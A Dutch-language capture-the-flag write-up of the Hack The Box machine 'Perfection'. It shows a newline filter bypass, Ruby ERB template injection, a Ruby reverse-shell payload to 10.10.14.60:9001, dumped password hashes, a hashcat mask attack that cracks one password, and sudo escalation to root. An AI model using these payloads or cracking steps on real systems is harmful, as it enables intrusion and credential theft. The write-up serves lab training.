# Perfection

Op het eerste gezicht lijkt het op een vrij simpele tool om gewogen cijfers te
berekenen.

Een 404 pagina doet een call naar `127.0.0.1:3000` om een plaatje op te halen!?
Draait er nog een andere server hier, in ieder geval niet publiekelijk
berschikbaar.

Op de calculator pagina krijg ik een `malicious input blocked` als ik tekens ala
`;/:` invul. Dit is dus niet puur een tekst waarde want anders zou je dit niet
hoeven te blokken. Even uitgaande dat het niet een fanatieke WAF is. Dezelfde
melding komt ook als er een veld mist.

Als ik in het command een `%0A` (newline) toevoeg dan gaat het command goed. Het
lijkt erop dat de `malicious input` check alleen de eerste regel bekijkt.
Wanneer ik `foo%0A<%= 7*7 %>` gebruik dan krijg netjes `49` terug in de output.
Hier is `<%= ... %>` een ruby ssti. Zie ook: https://trustedsec.com/blog/rubyerb-template-injection

Als we als payload (tussen de `<>`) het volgende gebruiken dan krijgen we een
hele mooie shell

```
spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.60",9001))
```

Hiermee ook gelijk de user flag te pakken.

Kijkend naar wat er op poort 3000 draait dan is dat gewoon de grade calculator.
Dit is dus waarschijnlijk een foutje in de CTF.

In de `~/Migration` folder vinden we wel een `sqlite3` database die users bevat.

```
id|name|password
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

> Heb een beetje valsgespeeld door de hints op het HTB forum erbij te pakken

Er is een mail in `/var/mail/susan` (_wie gebruikt dit!?_). Deze mail bevat info
over nieuwe wachtwoorden. Het relevante stukje:

```
{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.
```

Nu kunnen we `hashcat` gebruiken met een custom wordlist. Hier focussen we puur
op de `susan` user.

```bash
hashcat -D 1 -m 1400 -a 6 hashes.txt names.txt '?d?d?d?d?d?d?d?d?d'

# abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

Met dit wachtwoord hebben we ook `ssh` toegang en dit is hetzelfde wachtwoord
voor sudo. Een snelle `sudo /bin/bash` later en we hebben een root shell.
